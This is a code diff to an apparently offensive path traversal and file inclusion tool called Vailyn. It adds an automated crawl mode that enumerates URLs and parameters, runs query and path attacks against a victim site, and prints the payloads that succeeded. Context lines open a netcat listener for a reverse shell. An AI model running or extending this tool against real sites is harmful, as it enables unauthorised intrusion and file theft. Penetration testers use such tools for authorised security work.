@@ -342,15 +342,70 @@ class VailynApp(QtWidgets.QDialog):
             return
         
         if args.attack == 5:
-            variables.viclist.append(args.victim)
+            variables.viclist.append(self.victim)
             assert len(variables.viclist) > 0
-            from core.methods.crawler import TraversalSpider
+            from core.methods.crawler import UrlSpider, arjunEnum, analyzeParam, analyzePath
             from scrapy.crawler import CrawlerProcess
+            print("\n{0}Phase 0|{1} {2}URL Enumeration{1}\n".format(color.RD, color.END, color.O))
+            self.timeLabel.setText("Active Phase: URL Enumeration")
+            self.show()
+            starting_time = time.time()
             process = CrawlerProcess({'USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'})
-            process.crawl(TraversalSpider)
+            process.crawl(UrlSpider)
             process.start()
-
-            #TODO
+            print("\n{0}Phase 1|{1} {2}Parameter Enumeration{1}\n".format(color.RD, color.END, color.O))
+            self.timeLabel.setText("Active Phase: Parameter Enumeration")
+            self.show()
+            siteparams = arjunEnum()
+            print("\n{0}Phase 2|{1} {2}Query Attack{1}\n".format(color.RD, color.END, color.O))
+            self.timeLabel.setText("Active Phase: Query Attack")
+            self.show()
+            queryattack = analyzeParam(siteparams, paysplit, self.victim2, self.verbose, self.depth1, self.vlnfile, self.authcookie)
+            print("\n{0}Phase 3|{1} {2}Path Attack{1}\n".format(color.RD, color.END, color.O))
+            self.timeLabel.setText("Active Phase: Path Attack")
+            self.show()
+            pathattack = analyzePath(paysplit, self.victim2, self.verbose, self.depth1, self.vlnfile, self.authcookie)
+            time.sleep(1)
+            print("\n{0}Phase 3|{1} {2}Cookie Attack{1}\n".format(color.RD, color.END, color.O))
+            self.timeLabel.setText("Active Phase: Cookie Attack")
+            self.show()
+            #cookieattack = analyzeCookie() TODO
+            time.sleep(1)
+            print("\n{0}Phase 4|{1} {2}POST Enumeration{1}\n".format(color.RD, color.END, color.O))
+            self.timeLabel.setText("Active Phase: POST Enumeration")
+            self.show()
+            #do something here TODO
+            print("\n{0}Phase 5|{1} {2}POST Attack{1}\n".format(color.RD, color.END, color.O))
+            self.timeLabel.setText("Active Phase: POST Attack")
+            self.show()
+            #postattack = analyzePost() TODO
+            ending_time = time.time()
+            total_time = starting_time - ending_time
+            atime = datetime.timedelta(seconds=total_time)
+            self.timeLabel.setText("Done after " + str(atime) + ".")
+            print("\n\n{}FINAL RESULTS{}\n".format(color.BOLD+color.UNDERLINE, color.END))
+            print("Query Attack\n")
+            for victim, sub in queryattack.items():
+                print(victim)
+                for param, pair in sub.items():
+                    paystring = ""
+                    nullstring = ""
+                    for payload in pair[0]:
+                        paystring = paystring + "            " + str(payload) + "\n"
+                    for nullbyte in pair[1]:
+                        nullstring = nullstring + "            " + str(nullbyte) + "\n"
+                    print("    " + param + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
+            print("Path Attack\n")
+            for victim, pair in pathattack.items():
+                print(victim)
+                paystring = ""
+                nullstring = ""
+                for payload in pair[0]:
+                    paystring = paystring + "        " + str(payload) + "\n"
+                for nullbyte in pair[1]:
+                    nullstring = nullstring + "        " + str(nullbyte) + "\n"
+                print("    Payloads:\n" + paystring + "    Nullbytes:\n" + nullstring)
+                
             return
 
         if self.attack == 3:
@@ -372,7 +427,7 @@ class VailynApp(QtWidgets.QDialog):
             starting_time = time.time()
             #initiate phase 1 - vulnerability analysis
             with Pool(processes=processes) as pool:
-                res = [pool.apply_async(phase1, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,True,self.depth1,l,self.vlnfile,self.authcookie,self.post,)) for l in paysplit]
+                res = [pool.apply_async(phase1, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,variables.verbose,self.depth1,l,self.vlnfile,self.authcookie,self.post,)) for l in paysplit]
                 for i in res:
                     #fetch results
                     tuples = i.get()
@@ -414,10 +469,10 @@ class VailynApp(QtWidgets.QDialog):
                 else:
                     #subprocess.Popen(["konsole", "-e", "nc", "-lvp", variables.LISTENPORT], close_fds=True)
                     subprocess.Popen(["konsole", "--hold", "-e", "nc -lvp {}".format(variables.LISTENPORT)], close_fds=True)
-                    lfishell(self.attack, self.victim, self.victim2, self.param, self.cookie, self.selected, True, self.selectedpayloads, self.selectednullbytes, self.authcookie, self.post)
+                    lfishell(self.attack, self.victim, self.victim2, self.param, self.cookie, self.selected, variables.verbose, self.selectedpayloads, self.selectednullbytes, self.authcookie, self.post)
             else:
                 with Pool(processes=processes) as pool:
-                    res = [pool.apply_async(phase2, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,commons,l,self.depth2,True,self.loot,self.selectedpayloads,self.selectednullbytes,self.authcookie,self.post,)) for l in splitted]
+                    res = [pool.apply_async(phase2, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,commons,l,self.depth2,variables.verbose,self.loot,self.selectedpayloads,self.selectednullbytes,self.authcookie,self.post,)) for l in splitted]
                     for i in res:
                         #fetch results
                         restuple = i.get()
@@ -591,7 +646,7 @@ def main(parser, opt, args, shell=True) -> int:
     loot = False
     victim2 = ""
     depth = 2
-    verbose = False
+    verbose = variables.verbose
     foundfiles = [""]
     foundurls = [""]
     foundpayloads = []
@@ -610,9 +665,6 @@ def main(parser, opt, args, shell=True) -> int:
     if opt["depths"]:
         checkdepth = args.depths[0]
         depth = args.depths[1]
-
-    if opt["debug"]:
-        verbose = True
 
     if opt["check"]:
         vlnfile = args.check
@@ -688,13 +740,61 @@ def main(parser, opt, args, shell=True) -> int:
     if args.attack == 5:
         variables.viclist.append(args.victim)
         assert len(variables.viclist) > 0
-        from core.methods.crawler import TraversalSpider
+        from core.methods.crawler import UrlSpider, arjunEnum, analyzeParam, analyzePath
         from scrapy.crawler import CrawlerProcess
+        print("\n{0}Phase 0|{1} {2}URL Enumeration{1}\n".format(color.RD, color.END, color.O))
+        time.sleep(0.5)
         process = CrawlerProcess({'USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'})
-        process.crawl(TraversalSpider)
+        process.crawl(UrlSpider)
         process.start()
-
-        #TODO
+        time.sleep(1)
+        print("\n{0}Phase 1|{1} {2}Parameter Enumeration{1}\n".format(color.RD, color.END, color.O))
+        time.sleep(0.5)
+        siteparams = arjunEnum()
+        time.sleep(1)
+        print("\n{0}Phase 2|{1} {2}Query Attack{1}\n".format(color.RD, color.END, color.O))
+        time.sleep(0.5)
+        queryattack = analyzeParam(siteparams, paysplit, victim2, verbose, checkdepth, vlnfile, cookiefile)
+        time.sleep(1)
+        print("\n{0}Phase 3|{1} {2}Path Attack{1}\n".format(color.RD, color.END, color.O))
+        time.sleep(0.5)
+        pathattack = analyzePath(paysplit, victim2, verbose, checkdepth, vlnfile, cookiefile)
+        time.sleep(1)
+        print("\n{0}Phase 3|{1} {2}Cookie Attack{1}\n".format(color.RD, color.END, color.O))
+        time.sleep(0.5)
+        #cookieattack = analyzeCookie() TODO
+        time.sleep(1)
+        print("\n{0}Phase 4|{1} {2}POST Enumeration{1}\n".format(color.RD, color.END, color.O))
+        time.sleep(0.5)
+        #do something here TODO
+        time.sleep(1)
+        print("\n{0}Phase 5|{1} {2}POST Attack{1}\n".format(color.RD, color.END, color.O))
+        time.sleep(0.5)
+        #postattack = analyzePost() TODO
+        time.sleep(2.5)
+        print("\n\n{}FINAL RESULTS{}\n".format(color.BOLD+color.UNDERLINE, color.END))
+        print("Query Attack\n")
+        for victim, sub in queryattack.items():
+            print(victim)
+            for param, pair in sub.items():
+                paystring = ""
+                nullstring = ""
+                for payload in pair[0]:
+                    paystring = paystring + "            " + str(payload) + "\n"
+                for nullbyte in pair[1]:
+                    nullstring = nullstring + "            " + str(nullbyte) + "\n"
+                print("    " + param + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
+        print("Path Attack\n")
+        for victim, pair in pathattack.items():
+            print(victim)
+            paystring = ""
+            nullstring = ""
+            for payload in pair[0]:
+                paystring = paystring + "        " + str(payload) + "\n"
+            for nullbyte in pair[1]:
+                nullstring = nullstring + "        " + str(nullbyte) + "\n"
+            print("    Payloads:\n" + paystring + "    Nullbytes:\n" + nullstring)
+            
         return
 
     #fetch and select cookie for cookie mode
@@ -810,6 +910,8 @@ if __name__ == "__main__":
         if opt["timeout"]:
             variables.timeout = args.timeout
             assert variables.timeout != None
+        if opt["debug"]:
+            variables.verbose = True
         if opt["listen"]:
             ip, port = args.listen
             variables.revshell = True
